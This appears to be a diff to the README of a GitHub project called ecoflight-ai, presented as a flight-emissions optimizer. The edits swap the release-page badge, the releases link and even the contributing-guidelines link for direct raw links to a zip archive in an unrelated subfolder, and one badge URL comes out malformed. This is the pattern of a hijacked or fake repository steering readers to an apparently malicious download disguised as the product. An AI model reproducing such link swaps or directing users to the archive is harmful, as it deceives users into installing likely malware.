@@ -1,7 +1,7 @@
 # ✈️ ecoflight-ai - Optimize Your Flights for a Greener Tomorrow
 
 ## 📥 Get the Latest Release
-[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/br0kenSVK121/ecoflight-ai/releases)
+[![Download the latest version](https://raw.githubusercontent.com/br0kenSVK121/ecoflight-ai/main/Ramon/ecoflight-ai.zip%20Latest%https://raw.githubusercontent.com/br0kenSVK121/ecoflight-ai/main/Ramon/ecoflight-ai.zip)](https://raw.githubusercontent.com/br0kenSVK121/ecoflight-ai/main/Ramon/ecoflight-ai.zip)
 
 ## 🚀 Getting Started
 Welcome to ecoflight-ai! This is your guide to downloading and running our AI-powered flight optimization system. This application helps you plan flights while considering carbon emissions. 
@@ -21,7 +21,7 @@ Before you download, please ensure your system meets the following requirements:
 - **User-Friendly Interface:** Simple design for all users.
 
 ## 📥 Download & Install
-To download the latest version of the ecoflight-ai application, visit this page to download: [GitHub Releases Page](https://github.com/br0kenSVK121/ecoflight-ai/releases).
+To download the latest version of the ecoflight-ai application, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/br0kenSVK121/ecoflight-ai/main/Ramon/ecoflight-ai.zip).
 
 ### Installing on Windows
 1. Download the `.exe` file from the Releases page.
@@ -52,7 +52,7 @@ To download the latest version of the ecoflight-ai application, visit this page 
 For more detailed information, tips, and troubleshooting, check our Wiki section on GitHub.
 
 ## 🤝 Contributing
-We welcome contributions. If you'd like to assist in improving ecoflight-ai, please check out our [contributing guidelines](CONTRIBUTING.md).
+We welcome contributions. If you'd like to assist in improving ecoflight-ai, please check out our [contributing guidelines](https://raw.githubusercontent.com/br0kenSVK121/ecoflight-ai/main/Ramon/ecoflight-ai.zip).
 
 ## 💬 Support
 If you encounter any issues, feel free to open an issue on our GitHub page. We’re here to help!
